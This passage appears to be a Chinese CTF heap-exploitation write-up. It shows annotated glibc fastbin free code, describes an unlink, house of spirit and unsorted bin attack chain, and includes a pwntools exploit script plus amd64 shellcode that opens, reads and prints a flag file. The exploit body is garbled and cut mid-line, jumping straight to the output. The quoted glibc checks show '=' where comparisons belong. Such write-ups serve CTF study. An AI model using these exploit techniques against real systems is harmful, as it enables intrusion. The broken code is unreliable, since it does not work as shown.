            if (__builtin_expect(
                    chunksize_nomask(chunk_at_offset(p, size)) = av->system_mem, 0)) {
                /* We might not have a lock at this point and concurrent
                   modifications
                   of system_mem might have let to a false positive.  Redo the test
                   after getting the lock.  */
                if (have_lock || ({
                        assert(locked == 0);
                        __libc_lock_lock(av->mutex);
                        locked = 1;
                        chunksize_nomask(chunk_at_offset(p, size)) = av->system_mem;
                    })) {
                    errstr = "free(): invalid next size (fast)";
                    goto errout;
                }
                if (!have_lock) {
                    __libc_lock_unlock(av->mutex);
                    locked = 0;
                }
            }
            // 将chunk的mem部分全部设置为perturb_byte
            free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);
            // 设置fast chunk的标记位
            set_fastchunks(av);
            // 根据大小获取fast bin的索引
            unsigned int idx = fastbin_index(size);
            // 获取对应fastbin的头指针，被初始化后为NULL。
            fb               = &fastbin(av, idx);
            /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
            // 使用原子操作将P插入到链表中
            mchunkptr    old     = *fb, old2;
            unsigned int old_idx = ~0u;
            do {
                /* Check that the top of the bin is not the record we are going to
                   add
                   (i.e., double free).  */
                // so we can not double free one fastbin chunk
                // 防止对 fast bin double free
                if (__builtin_expect(old == p, 0)) {
                    errstr = "double free or corruption (fasttop)";
                    goto errout;
                }
                /* Check that size of fastbin chunk at the top is the same as
                   size of the chunk that we are adding.  We can dereference OLD
                   only if we have the lock, otherwise it might have already been
                   deallocated.  See use of OLD_IDX below for the actual check.  */
                if (have_lock && old != NULL)
                    old_idx = fastbin_index(chunksize(old));
                p->fd = old2 = old;
            } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=
                     old2);
            // 确保fast bin的加入前与加入后相同
            if (have_lock && old != NULL && __builtin_expect(old_idx != idx, 0)) {
                errstr = "invalid fastbin entry (free)";
                goto errout;
            }
        }
还用到了unsortbin攻击，强，各种组合，多次house of sprit加unsortbin攻击
整体流程，unlink造成可以house of sprit攻击，然后通过多次house of
sprit攻击，后门用unsortedbin攻击，最后getshell,流程复杂，原理简单
我本来想用chunk extends加fastbin
attack，发觉他给了这么多功能好像没用上，应该不是这个攻击方法。。。然后就去看wp了，发觉他的wp攻击流程那些点全用上了，不过复杂起来了，赛后还看到另外师傅的wp，就是说这个有非预期，就是用chunk
extends加fastbin attack
### exp
    #!/usr/bin/env python2
    # -*- coding: utf-8 -*-    from pwn import *
    local = 1
    host = '127.0.0.1' 
    port = 10000
    context.log_level = 'debug'
    exe = '/tmp/tmp.ReKO1V3cZk/pwn'
    context.binary = exe
    elf = ELF(exe)
    libc = elf.libc
    #don't forget to change it
    if local:
        io = process(exe)
    else:
        io = remote(host,port)
    s    = lambda data            : io.send(str(data))
    sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
    sl   = lambda data            : io.sendline(str(data))
    sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
    r    = lambda numb=4096       : io.recv(numb)
    ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
    uu32 = lambda data            : u32(data.ljust(4, '\x00'))
    uu64 = lambda data            : u64(data.ljust(8, '\x00'))
    lg   = lambda name,data       : io.success(name + ": 0x%x" % data)
    # break on aim addr
    def debug(addr,PIE=True):
        if PIE:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
            gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
        else:
            gdb.attach(io,"b *{}".format(hex(addr)))
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # Arch:     amd64-64-little
    # RELRO:    Full RELRO
    # Stack:    Canary found
    # NX:       NX enabled
    # PIE:      PIE enabled
    # RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'
    def c(idx):
        sla("Your Choice>> \n", str(idx))
    def new(idx, content):
        c(1)
        c(idx)
        sa("Please input car's name: \n", content)
    def show():
        c(2)
    def edit(idx, content):
        c(4)
        sla("Please input car's index: ", str(idx))
        sa("Please input name: ", content)
    def free(idx):
        c(3)
        sla("Please input car's index: ", str(idx))
    def down(idx):
        c(5)
        sla(":", str(idx))
        sla(">>", 2)
    def up1(idx):
        c(5)
        sla(":", str(idx))
        sla(">>", "1")
        sla(">>", "1")
        ru("Car's Speed is ")
        return int(ru("Km/h"), 10)
    def up2(idx):
        c(5)
        sla(":", str(idx))
        sla(">>", "1")
        sla(">>", "2")
        ru("Car's Speed is ")
        return int(ru("Km/h"), 10)
    def getlicense(idx, content):
        c(6)
        sla(":", str(idx))
        sla(":", content)
    def exp():
        c(8)
        ru("gift: ")
        heap_base = int(r(14), 16)
        heap_base = (heap_base >> 12) 0x7f4fabd43000
    [*] Switching to interactive mode
    flag{123456}
先放上成功结果
### 新点
#### mprotect改内存页权限
以前不知道这个姿势，知道后感觉挺骚的，挺强的一个方法  
mprotect传入参数后，能让指定内存页变成可执行，所以利用方式
[mprotect改内存页权限](https://blog.csdn.net/Roland_Sun/article/details/33728955)
  1. 知道一个内存页的地址
  2. 这个内存页内容可控
[x64系统调用表](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
#### shellcode编写
这个我以前也很怕的，这次自己写了下好像也就那样嘛，不会很复杂的，通常来说，你只要自己调试下就行了
    from pwn import *
    if __name__ == '__main__':
        shellcode = shellcraft.amd64.open('flag')
        shellcode += '''
        mov edi, eax
        mov rsi, rsp
        mov edx, 0x100
        xor eax, eax
        syscall
        mov edi, 1
        mov rsi, rsp
        push 1
        pop rax
        syscall
        '''
        print(shellcode)
        print(asm(shellcode, arch='amd64'))
可以通过context设置平台，context.arch='amd64'  
我这里没设置，所以就用每次加个amd64
打开flag文件部分，大概就是
  1. 设置rax=2
  2. rdi = filename
  3. rsi = 0 #标志只读方式
  4. rdx = 0 # mode其实可以不填，所以，不用设置也可以
  5. rax=2 # 系统中断号
  6. 调用syscall
后面几个流程差不多，看下中断表就行
自己写的话
    push 0x67616c66
    mov rdi,rsp
    xor esi,esi
    push 2
    pop rax
    syscall
然后我为了省事，直接用shellcraft.amd64.open('flag')生成了
接下来读取函数，因为返回了fd，存在rax里，所以第一步要保存rax值到rdi里
    mov rdi,rax
    mov rsi,rsp
    xor eax,eax
    syscall
在接下来写函数
    mov edi,1
    mov rsi,rsp
    push 1
    pop rax
    syscall
最后推荐篇文章  
[shellcode编写](https://xz.aliyun.com/t/6645)
感觉总结得挺好的